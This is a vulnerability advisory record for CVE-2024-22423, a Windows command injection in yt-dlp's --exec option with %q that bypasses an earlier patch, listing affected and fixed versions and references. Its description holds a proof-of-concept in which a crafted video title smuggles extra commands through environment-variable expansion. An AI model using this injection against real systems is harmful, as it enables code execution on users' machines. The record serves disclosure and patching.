---
identifier: "CVE-2024-22423"
identifiers:
- "CVE-2024-22423"
- "GHSA-hjq6-52gw-2g7p"
package_slug: "pypi/yt-dlp"
title: "yt-dlp: `--exec` command injection when using `%q` in yt-dlp on Windows (Bypass
  of CVE-2023-40581)"
description: "The [patch that addressed CVE-2023-40581](https://github.com/yt-dlp/yt-dlp/commit/de015e930747165dbb8fcd360f8775fd973b7d6e)
  attempted to prevent RCE when using `--exec` with `%q` by replacing double quotes
  with two double quotes.\nHowever, this escaping is not sufficient, and still allows
  expansion of environment variables.\n\nSupport for output template expansion in
  `--exec`, along with this vulnerable behavior, was added to `yt-dlp` in version
  [2021.04.11](https://github.com/yt-dlp/yt-dlp/releases/tag/2021.04.11).\n\n```cmd\n>
  yt-dlp \"https://youtu.be/42xO6rVqf2E\" --ignore-config -f 18 --exec \"echo %(title)q\"\n[youtube]
  Extracting URL: https://youtu.be/42xO6rVqf2E\n[youtube] 42xO6rVqf2E: Downloading
  webpage\n[youtube] 42xO6rVqf2E: Downloading ios player API JSON\n[youtube] 42xO6rVqf2E:
  Downloading android player API JSON\n[youtube] 42xO6rVqf2E: Downloading m3u8 information\n[info]
  42xO6rVqf2E: Downloading 1 format(s): 18\n[download] Destination: %CMDCMDLINEï¼š~-1%&echo
  pwned&calc.exe [42xO6rVqf2E].mp4\n[download] 100% of  126.16KiB in 00:00:00 at 2.46MiB/s\n[Exec]
  Executing command: echo \"%CMDCMDLINE:~-1%&echo pwned&calc.exe\"\n\"\"\npwned\n```"
date: "2024-04-10"
pubdate: "2024-04-10"
affected_range: ">=2021.04.11,<2024.04.09"
fixed_versions:
- "2024.04.09"
affected_versions: "All versions starting from 2021.04.11 before 2024.04.09"
not_impacted: "All versions before 2021.04.11, all versions starting from 2024.04.09"
solution: "Upgrade to version 2024.04.09 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2024-22423"
- "https://github.com/advisories/GHSA-hjq6-52gw-2g7p"
- "https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-42h4-v29r-42qg"
- "https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-hjq6-52gw-2g7p"
- "https://github.com/yt-dlp/yt-dlp/commit/de015e930747165dbb8fcd360f8775fd973b7d6e"
- "https://github.com/yt-dlp/yt-dlp/commit/ff07792676f404ffff6ee61b5638c9dc1a33a37a"
- "https://github.com/yt-dlp/yt-dlp"
- "https://github.com/yt-dlp/yt-dlp/releases/tag/2021.04.11"
- "https://github.com/yt-dlp/yt-dlp/releases/tag/2024.04.09"
cvss_v3: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"
uuid: "deaf5f3e-3a5f-41c9-98b0-ba9a22d5613c"
cwe_ids:
- "CWE-78"
- "CWE-937"
- "CWE-1035"
